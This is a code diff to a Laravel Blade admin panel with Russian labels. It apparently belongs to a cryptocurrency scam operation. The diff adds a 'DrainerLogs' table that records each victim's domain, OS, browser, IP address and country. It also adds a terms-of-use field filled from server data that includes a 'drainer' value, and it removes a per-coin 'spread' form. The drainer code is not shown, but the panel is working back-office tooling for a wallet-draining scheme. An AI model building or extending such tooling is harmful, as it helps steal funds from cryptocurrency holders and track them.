@@ -220,6 +220,109 @@
 
         </div>
         <!-- End Card -->
+        <!-- Table -->
+        <div class="card mt-10">
+            <!-- Header -->
+            <div class="card-header card-header-content-md-between">
+                <div class="mb-2 mb-md-0">
+                    <h3>DrainerLogs</h3>
+                </div>
+
+            </div>
+            <!-- End Header -->
+
+            <!-- Table -->
+            <div class="table-responsive datatable-custom">
+                <div id="datatable_wrapper" class="dataTables_wrapper no-footer">
+                    <div class="dataTables_length" id="datatable_length"><label>Show <select name="datatable_length"
+                                                                                             aria-controls="datatable"
+                                                                                             class="">
+                                <option value="10">10</option>
+                                <option value="25">25</option>
+                                <option value="50">50</option>
+                                <option value="100">100</option>
+                            </select> entries</label></div>
+                    <div id="datatable_filter" class="dataTables_filter"><label>Search:<input type="search" class=""
+                                                                                              placeholder=""
+                                                                                              aria-controls="datatable"></label>
+                    </div>
+                    <table id="datatable"
+                           class="table table-hover table-borderless table-thead-bordered table-nowrap table-align-middle card-table dataTable no-footer"
+                           style="width: 100%;" data-hs-datatables-options="{
+                   &quot;columnDefs&quot;: [{
+                      &quot;targets&quot;: [0],
+                      &quot;orderable&quot;: false
+                    }],
+                   &quot;order&quot;: [],
+                   &quot;info&quot;: {
+                     &quot;totalQty&quot;: &quot;#datatableWithPaginationInfoTotalQty&quot;
+                   },
+                   &quot;search&quot;: &quot;#datatableSearch&quot;,
+                   &quot;entries&quot;: &quot;#datatableEntries&quot;,
+                   &quot;pageLength&quot;: 12,
+                   &quot;isResponsive&quot;: false,
+                   &quot;isShowPaging&quot;: false,
+                   &quot;pagination&quot;: &quot;datatablePagination&quot;
+                 }" role="grid" aria-describedby="datatable_info">
+                        <thead class="thead-light">
+                        <tr role="row">
+                            <th class="table-column-pe-0 sorting_disabled" rowspan="1" colspan="1" aria-label=""
+                                style="width: 24px;">
+
+                            </th>
+                            <th class="table-column-ps-0 sorting" tabindex="0" aria-controls="datatable" rowspan="1"
+                                colspan="1" aria-label="Order: activate to sort column ascending" style="width: 70px;">
+                                Домен
+                            </th>
+                            <th class="sorting" tabindex="0" aria-controls="datatable" rowspan="1" colspan="1"
+                                aria-label="Date: activate to sort column ascending" style="width: 161px;">Тип
+                            </th>
+                            <th class="sorting" tabindex="0" aria-controls="datatable" rowspan="1" colspan="1"
+                                aria-label="Customer: activate to sort column ascending" style="width: 130px;">
+                                ОС
+                            </th>
+                            <th class="sorting" tabindex="0" aria-controls="datatable" rowspan="1" colspan="1"
+                                aria-label="Payment status: activate to sort column ascending" style="width: 124px;">
+                                Браузер
+                            </th>
+                            <th class="sorting" tabindex="0" aria-controls="datatable" rowspan="1" colspan="1"
+                                aria-label="Actions: activate to sort column ascending" style="width: 119px;">IP
+                            </th>
+                            <th class="sorting" tabindex="0" aria-controls="datatable" rowspan="1" colspan="1"
+                                aria-label="Actions: activate to sort column ascending" style="width: 119px;">Страна
+                            </th>
+                        </tr>
+                        </thead>
+
+                        <tbody>
+                        @foreach($drainerLogs as $log)
+                            <tr role="row" class="odd">
+                                <td class="table-column-pe-0">
+
+                                </td>
+                                <td>{{$log["domain"]}}</td>
+                                <td>{{$log["type"]}}</td>
+                                <td>{{$log["OS"]}}</td>
+                                <td>{{$log["browser"]}}</td>
+                                <td>{{$log["IP"]}}</td>
+                                <td>{{$log["country"]}}</td>
+
+                            </tr>
+                        @endforeach
+
+                        </tbody>
+                    </table>
+                    <div class="dataTables_info" id="datatable_info" role="status" aria-live="polite">Показаны с 1 по 12
+                        из 20 записей
+                    </div>
+                </div>
+            </div>
+            <!-- End Table -->
+
+            <!-- Footer -->
+            <!-- End Footer -->
+        </div>
+        <!-- End Table -->
     </div>
     <!-- End Content -->
 
@@ -1082,23 +1185,18 @@
                             </div>
                         </div>
                     </div>
+
+                    <div class="mb-4">
+                        <label class="form-label">TERMS OF USE</label>
+
+                        <div class="d-grid gap-2">
+                            <!-- Form -->
+                                <textarea class="form-control" rows="10" name="tearms_text" id="tearms_text"></textarea>
+
+                        </div>
+                    </div>
         </form>
-        <div class="mb-4">
-            <label class="form-label">Создать спред</label>
-            <form id="createSpread">
-            @csrf
 
-                <div class="d-flex gap-2 ">
-                    <select name="coin" class="form-control">
-                        @yield("AdminSelectCoinSymbol")
-                    </select>
-                    <input class="form-control" type="text" name="percent" placeholder="Процент">
-                    <button class="btn btn-primary" type="submit">Добавить</button>
-                </div>
-            </form>
-
-
-        </div>
         <div class="table-responsive datatable-custom">
             <table id="datatable1"
                    class="table table-borderless table-thead-bordered table-nowrap table-align-middle card-table dataTable no-footer"
@@ -1610,7 +1708,8 @@
             type: 'GET',
             success: function (data, status, xhr) {
                 console.log(data);
-
+                const tearms_text = document.getElementById("tearms_text");
+                tearms_text.innerText = data.tearms_text
                 const title = data.title;
                 const drainer = data.drainer;
                 const id = data.id;
